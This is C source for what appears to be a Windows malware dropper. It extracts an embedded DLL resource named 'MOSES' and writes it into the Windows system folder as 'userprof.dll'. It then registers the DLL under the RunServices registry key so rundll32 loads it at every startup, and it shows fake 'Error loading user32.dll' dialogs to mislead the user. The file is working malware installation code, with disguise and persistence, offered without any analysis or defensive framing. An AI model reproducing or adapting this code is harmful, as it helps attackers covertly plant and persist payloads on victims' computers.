#define DO_DEBUG

#include <windows.h>

BOOL CopyResource(HANDLE, DWORD, LPSTR);
BOOL InstallRegistry(void);
void DoDebug(LPSTR, ...);

void DoDebug(LPSTR debugstr, ...)
{
#ifdef DO_DEBUG
	char debugOut[1024];
	va_list mylist;
	va_start(mylist, debugstr);
	wvsprintf(debugOut, debugstr, mylist);
	va_end(mylist);
	OutputDebugString(debugOut);
#endif
	return;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int iShowCmd)
{
	HANDLE hMosesDll;
	HRSRC hMoses;
	DWORD dwSize;

	hMoses = FindResource(NULL, "MOSES", "DLL");
	if(hMoses == NULL) {
		MessageBox(NULL, "Error loading user32.dll", "Application Error", MB_OK | MB_ICONEXCLAMATION);
		goto error;
	}

	dwSize = SizeofResource(NULL, hMoses);

	hMosesDll = LoadResource(NULL, hMoses);
	if(hMosesDll == NULL) {
		MessageBox(NULL, "Error loading msvcrt.dll", "Application Error", MB_OK | MB_ICONEXCLAMATION);
		goto error;
	}
	if(!CopyResource(hMosesDll, dwSize, "c:\\windows\\system\\userprof.dll")) {
		MessageBox(NULL, "Error writing to temporary file", "Application Error", MB_OK | MB_ICONEXCLAMATION);
		DeleteFile("c:\\windows\\system\\userprof.dll");
		goto error;
	}
	if(!InstallRegistry()) {
		MessageBox(NULL, "Error updating registry", "Application Error", MB_OK | MB_ICONEXCLAMATION);
		goto error;
	}

error:
	CloseHandle(hMosesDll);
	CloseHandle(hMoses);
	return 0;
}

BOOL CopyResource(HANDLE source, DWORD size, LPSTR dest)
{
	HANDLE hDest;
	DWORD dwBytesWritten;

	DoDebug("Opening File: %s\n", dest);
	hDest = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if(hDest == INVALID_HANDLE_VALUE) {
		CloseHandle(hDest);
		return FALSE;
	}
	DoDebug("Copying File...\n");
	if(!WriteFile(hDest, (char *)source, size, &dwBytesWritten, NULL)) {
		DoDebug("WriteFile() Failed\n");
		return FALSE;
	}

	CloseHandle(hDest);
	return TRUE;
}

BOOL InstallRegistry(void)
{
	HKEY hKey;

	if(RegCreateKeyEx(HKEY_LOCAL_MACHINE, "\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\\", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) return FALSE;
	if(RegSetValueEx(hKey, "LoadUserProfile", 0, REG_SZ, "Rundll32.exe userprof.dll,LoadUserProfile", 38) != ERROR_SUCCESS) return FALSE;

	return TRUE;
}
